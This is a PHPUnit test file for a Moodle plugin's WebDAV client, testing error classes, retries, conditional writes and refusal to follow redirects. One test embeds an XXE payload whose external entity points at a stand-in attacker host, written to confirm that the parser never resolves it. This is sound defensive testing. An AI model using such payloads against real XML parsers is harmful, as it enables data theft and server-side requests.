<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

namespace local_kurspilot\webdav;

use local_kurspilot\tests\webdav\fake_webdav_transport;
use PHPUnit\Framework\Attributes\CoversClass;

/**
 * Der eigene WebDAV-Client gegen den In-Memory-Fake (Issue #489, Spec #486
 * §4/Testing Decisions, ADR 0022): Fehlerklassen statt Statuscodes, die
 * 404-Unterscheidung, stille Wiederholung, bedingtes Schreiben, PROPFIND-
 * Auswertung, Ordnerketten und der Geheimnis-Test.
 *
 * @package    local_kurspilot
 * @copyright  2026 Kurspilot
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */
#[CoversClass(webdav_client::class)]
final class webdav_client_test extends \advanced_testcase {

    /**
     * Fester Zeitgeber fuer den Wiederholungs-Takt (Spec: "Im Test wird
     * nicht wirklich gewartet") - der Sleeper ruckt die Uhr vor, statt zu
     * schlafen.
     *
     * @return array{0: webdav_client, 1: fake_webdav_transport}
     */
    private function client(fake_webdav_transport $fake): array {
        $time = 0.0;
        $clock = static function () use (&$time): float {
            return $time;
        };
        $sleeper = static function (float $seconds) use (&$time): void {
            $time += $seconds;
        };
        return [new webdav_client($fake, $clock, $sleeper), $fake];
    }

    private function url(string $path = ''): string {
        return 'https://fake.example/dav' . $path;
    }

    public function test_propfind_lists_name_type_size_time_etag_mimetype(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $seeded = $fake->seed_file('/dav/ordner/bild.png', 'bytes');

        $entries = $client->propfind($this->url('/ordner'), 1);

        $this->assertCount(1, $entries);
        $entry = $entries[0];
        $this->assertSame('bild.png', $entry['name']);
        $this->assertSame('file', $entry['type']);
        $this->assertSame(5, $entry['size']);
        $this->assertSame($seeded['lastmodified'], $entry['timemodified']);
        $this->assertSame($seeded['etag'], $entry['etag']);
        $this->assertSame('image/png', $entry['mimetype']);
    }

    public function test_propfind_percent_decodes_names(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $fake->seed_file('/dav/ordner/späte notiz.md', 'x');

        $entries = $client->propfind($this->url('/ordner'), 1);

        $this->assertSame('späte notiz.md', $entries[0]['name']);
    }

    public function test_propfind_depth_zero_returns_only_the_resource_itself(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $fake->seed_file('/dav/ordner/a.md', 'a');
        $fake->seed_file('/dav/ordner/b.md', 'b');

        $entries = $client->propfind($this->url('/ordner/a.md'), 0);

        $this->assertCount(1, $entries);
        $this->assertSame('a.md', $entries[0]['name']);
    }

    public function test_propfind_root_can_show_iserv_area_menu(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->as_iserv_root('/dav');
        $fake->seed_file('/dav/sollte-nicht-erscheinen.md', 'x');

        $entries = $client->propfind($this->url(), 1);

        $names = array_column($entries, 'name');
        sort($names);
        $this->assertSame(['Files', 'Groups', 'Print', 'Temp', 'Windows'], $names);
        $this->assertNotContains('sollte-nicht-erscheinen.md', $names);
    }

    public function test_get_returns_body(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/datei.md', 'Inhalt');

        $this->assertSame('Inhalt', $client->get($this->url('/datei.md')));
    }

    public function test_get_missing_file_is_not_found(): void {
        [$client] = $this->client(new fake_webdav_transport());

        $this->expectException(webdav_error::class);
        $this->expectExceptionMessage('HTTP 404');
        try {
            $client->get($this->url('/fehlt.md'));
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::NOT_FOUND, $e->errorclass);
            throw $e;
        }
    }

    public function test_put_new_sends_if_none_match_star(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());

        $client->put_new($this->url('/neu.md'), 'Inhalt');

        $this->assertSame('Inhalt', $fake->request('GET', $this->url('/neu.md'))->body);
        $puts = array_values(array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'PUT'));
        $this->assertSame('*', $puts[0]['headers']['If-None-Match']);
    }

    public function test_put_new_conflicts_when_file_already_exists(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/da.md', 'alt');

        try {
            $client->put_new($this->url('/da.md'), 'neu');
            $this->fail('CONFLICT erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::CONFLICT, $e->errorclass);
        }
    }

    public function test_put_overwrite_sends_if_match_with_etag(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $seeded = $fake->seed_file('/dav/da.md', 'alt');

        $client->put_overwrite($this->url('/da.md'), 'neu', $seeded['etag']);

        $puts = array_values(array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'PUT'));
        $this->assertSame($seeded['etag'], $puts[0]['headers']['If-Match']);
    }

    public function test_put_overwrite_conflicts_on_etag_mismatch(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/da.md', 'alt');

        try {
            $client->put_overwrite($this->url('/da.md'), 'neu', '"veralteter-etag"');
            $this->fail('CONFLICT erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::CONFLICT, $e->errorclass);
        }
    }

    public function test_put_overwrite_without_etag_uses_lastmodified_as_weak_substitute(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->without_etags();
        $seeded = $fake->seed_file('/dav/da.md', 'alt');

        $client->put_overwrite($this->url('/da.md'), 'neu', null, $seeded['lastmodified']);

        $this->assertSame('neu', $client->get($this->url('/da.md')));
    }

    public function test_put_overwrite_without_etag_conflicts_on_stale_lastmodified(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->without_etags();
        $fake->seed_file('/dav/da.md', 'alt');

        try {
            $client->put_overwrite($this->url('/da.md'), 'neu', null, 1);
            $this->fail('CONFLICT erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::CONFLICT, $e->errorclass);
        }
    }

    public function test_mkcol_chain_creates_each_level_and_tolerates_existing_ones(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav');

        $client->mkcol_chain($this->url(), ['faecher', 'mathe']);
        // Zweiter Lauf ueber dieselbe Kette darf nicht scheitern (405 wird toleriert).
        $client->mkcol_chain($this->url(), ['faecher', 'mathe']);

        $entries = $client->propfind($this->url('/faecher'), 1);
        $this->assertSame('mathe', $entries[0]['name']);
        $this->assertSame('folder', $entries[0]['type']);
        $mkcols = array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'MKCOL');
        $this->assertCount(4, $mkcols);
    }

    public function test_move_moves_the_entry(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/alt.md', 'Inhalt');

        $client->move($this->url('/alt.md'), $this->url('/neu.md'));

        $this->assertSame('Inhalt', $client->get($this->url('/neu.md')));
        $this->expectException(webdav_error::class);
        $client->get($this->url('/alt.md'));
    }

    public function test_delete_removes_the_entry(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/weg.md', 'Inhalt');

        $client->delete($this->url('/weg.md'));

        try {
            $client->get($this->url('/weg.md'));
            $this->fail('NOT_FOUND erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::NOT_FOUND, $e->errorclass);
        }
    }

    public function test_auth_rejected_for_401(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->deny_auth(401);

        try {
            $client->get($this->url('/x.md'));
            $this->fail('AUTH_REJECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::AUTH_REJECTED, $e->errorclass);
        }
    }

    public function test_auth_rejected_for_403(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->deny_auth(403);

        try {
            $client->get($this->url('/x.md'));
            $this->fail('AUTH_REJECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::AUTH_REJECTED, $e->errorclass);
        }
    }

    public function test_429_and_503_are_treated_as_unclear_and_retried(): void {
        $codes = [429, 503];
        foreach ($codes as $code) {
            $calls = 0;
            $transport = new class ($code, $calls) implements webdav_transport {
                public function __construct(private readonly int $code, private int $calls) {
                }
                public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                    $this->calls++;
                    if ($this->calls === 1) {
                        return new webdav_response($this->code, [], '');
                    }
                    return new webdav_response(200, [], 'ok');
                }
            };
            $time = 0.0;
            $client = new webdav_client(
                $transport,
                static function () use (&$time): float {
                    return $time;
                },
                static function (float $s) use (&$time): void {
                    $time += $s;
                },
            );
            $this->assertSame('ok', $client->get('https://fake.example/dav/x.md'), (string) $code);
        }
    }

    public function test_storage_full_is_507(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->fill_storage();

        try {
            $client->put_new($this->url('/x.md'), 'x');
            $this->fail('STORAGE_FULL erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::STORAGE_FULL, $e->errorclass);
        }
    }

    public function test_html_404_is_unclear_and_the_client_retries_silently_until_recovery(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/x.md', 'Inhalt');
        $fake->throttle(2);

        $this->assertSame('Inhalt', $client->get($this->url('/x.md')));
    }

    public function test_unclear_is_returned_once_the_retry_budget_is_exhausted(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->throttle(1_000);

        try {
            $client->get($this->url('/x.md'));
            $this->fail('UNCLEAR erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNCLEAR, $e->errorclass);
        }
    }

    /**
     * @return array<string, array{0: int}>
     */
    public static function redirect_statuscodes(): array {
        return ['301' => [301], '302' => [302], '303' => [303], '307' => [307], '308' => [308]];
    }

    /**
     * Jede 3xx-Antwort ist ein benannter Fehler (Issue #510) - der Client
     * folgt keiner Weiterleitung, sonst koennten Anmeldedaten an eine vom
     * Server bestimmte, moeglicherweise unverschluesselte Adresse gelangen.
     *
     * @dataProvider redirect_statuscodes
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('redirect_statuscodes')]
    public function test_3xx_response_is_a_named_redirected_error_and_is_not_followed(int $statuscode): void {
        $transport = new class ($statuscode) implements webdav_transport {
            public int $calls = 0;
            public function __construct(private readonly int $statuscode) {
            }
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                $this->calls++;
                return new webdav_response($this->statuscode, ['location' => 'https://anderswo.example/dav/'], '');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->get('https://fake.example/dav/x.md');
            $this->fail('REDIRECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::REDIRECTED, $e->errorclass);
        }
        // Genau eine Anfrage - keine automatische Weiterleitung, keine stille Wiederholung.
        $this->assertSame(1, $transport->calls);
    }

    /**
     * Eine 2xx-Antwort auf PROPFIND, deren Rumpf nicht als XML lesbar ist,
     * gilt als "unklar" - nie als leerer Ordner (Issue #510, sonst entfallen
     * Uebergabe-Hinweis und Altbestand-Erkennung still).
     */
    /**
     * Spec §"kein PUT landet an einer Adresse, die der Server bestimmt"
     * (Issue #510): eine 3xx-Antwort auf PUT ist derselbe benannte Fehler wie
     * bei GET, nie ein zweiter PUT an die vom Server genannte `Location`.
     */
    public function test_put_on_3xx_is_redirected_and_never_repeated_at_the_server_chosen_address(): void {
        $transport = new class implements webdav_transport {
            public int $calls = 0;
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                $this->calls++;
                return new webdav_response(302, ['location' => 'https://anderswo.example/dav/x.md'], '');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->put_new('https://fake.example/dav/x.md', 'Inhalt');
            $this->fail('REDIRECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::REDIRECTED, $e->errorclass);
        }
        $this->assertSame(1, $transport->calls, 'Kein zweiter PUT an die vom Server genannte Adresse.');
    }

    public function test_propfind_with_unreadable_body_on_2xx_is_unclear_not_an_empty_folder(): void {
        $transport = new class implements webdav_transport {
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                return new webdav_response(207, [], 'kein XML');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->propfind('https://fake.example/dav/ordner', 1);
            $this->fail('UNCLEAR erwartet, keine leere Liste.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNCLEAR, $e->errorclass);
        }
    }

    /**
     * XML-Parsing laedt nichts aus dem Netz (Issue #510): ein PROPFIND-Rumpf
     * mit einer externen Entity darf keinen Netzzugriff ausloesen. Ohne echten
     * Netzzugriff im Testlauf laesst sich ein unterbliebener Fetch nicht am
     * Ergebnis, aber an der Laufzeit erkennen - ein Versuch, die Adresse
     * aufzuloesen, wuerde die Anfrage spuerbar verzoegern oder haengen lassen.
     */
    public function test_propfind_never_resolves_an_external_entity_in_the_body(): void {
        $xxe = '<?xml version="1.0"?>'
            . '<!DOCTYPE d:multistatus [<!ENTITY xxe SYSTEM "https://angreifer.invalid/loot">]>'
            . '<d:multistatus xmlns:d="DAV:"><d:response><d:href>&xxe;</d:href></d:response></d:multistatus>';
        $transport = new class ($xxe) implements webdav_transport {
            public function __construct(private readonly string $body) {
            }
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                return new webdav_response(207, [], $this->body);
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        $start = microtime(true);
        try {
            $client->propfind('https://fake.example/dav/ordner', 1);
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNCLEAR, $e->errorclass);
        }
        $this->assertLessThan(2.0, microtime(true) - $start, 'Kein Netzversuch darf die Antwort verzoegern.');
    }

    public function test_http_urls_are_rejected(): void {
        [$client] = $this->client(new fake_webdav_transport());

        $this->expectException(\InvalidArgumentException::class);
        $client->get('http://fake.example/dav/x.md');
    }

    public function test_transport_connection_failure_becomes_unreachable(): void {
        $transport = new class implements webdav_transport {
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                throw new webdav_transport_exception('Zeitueberschreitung.');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->get('https://fake.example/dav/x.md');
            $this->fail('UNREACHABLE erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNREACHABLE, $e->errorclass);
        }
    }

    /**
     * Geheimnis-Test (Spec §3/§8): Das Passwort "der Fake-Instanz" erscheint
     * in keiner Ausnahme, ueber alle sieben Fehlerklassen hinweg. Jedes
     * Szenario baut seinen eigenen, mit demselben Geheimnis versehenen Fake
     * und fuehrt die tatsaechlich fehlschlagende Aktion selbst aus.
     *
     * @return array<string, callable(webdav_client, fake_webdav_transport): void>
     */
    private function secret_leak_scenarios(): array {
        return [
            'nicht gefunden' => static function (webdav_client $client): void {
                $client->get('https://fake.example/dav/fehlt.md');
            },
            'unklar/gedrosselt' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->throttle(1_000);
                $client->get('https://fake.example/dav/x.md');
            },
            'Anmeldung abgelehnt' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->deny_auth();
                $client->get('https://fake.example/dav/x.md');
            },
            'Speicher voll' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->fill_storage();
                $client->put_new('https://fake.example/dav/x.md', 'x');
            },
            'Konflikt' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->seed_file('/dav/da.md', 'alt');
                $client->put_new('https://fake.example/dav/da.md', 'neu');
            },
        ];
    }

    /**
     * Wie {@see secret_leak_scenarios()}, aber fuer REDIRECTED, das keinen
     * eigenen Fake-Zustand hat, sondern einen eigenen Transport braucht -
     * der In-Memory-Fake kann kein 3xx liefern.
     */
    public function test_secret_never_leaks_via_a_redirected_error(): void {
        $secret = 'g3h31m-' . uniqid();
        $transport = new class ($secret) implements webdav_transport {
            public function __construct(private readonly string $secret) {
            }
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                return new webdav_response(302, ['location' => 'https://anderswo.example/' . $this->secret], '');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->get('https://fake.example/dav/x.md');
            $this->fail('REDIRECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertStringNotContainsString($secret, $e->getMessage());
            $this->assertStringNotContainsString($secret, $e->errorclass);
        }
    }

    public function test_secret_never_leaks_across_any_error_class(): void {
        $secret = 'g3h31m-' . uniqid();

        foreach ($this->secret_leak_scenarios() as $name => $action) {
            $fake = new fake_webdav_transport($secret);
            [$client] = $this->client($fake);

            try {
                $action($client, $fake);
                $this->fail($name . ': ein benannter Fehler wurde erwartet.');
            } catch (webdav_error $e) {
                $this->assertStringNotContainsString($secret, $e->getMessage(), $name);
                $this->assertStringNotContainsString($secret, $e->errorclass, $name);
            }
        }

        // UNREACHABLE: der Transport selbst wirft, ohne je ein Geheimnis zu sehen.
        $transport = new class implements webdav_transport {
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                throw new webdav_transport_exception('Zeitueberschreitung.');
            }
        };
        try {
            (new webdav_client($transport))->get('https://fake.example/dav/x.md');
            $this->fail('UNREACHABLE erwartet.');
        } catch (webdav_error $e) {
            $this->assertStringNotContainsString($secret, $e->getMessage());
        }
    }
}
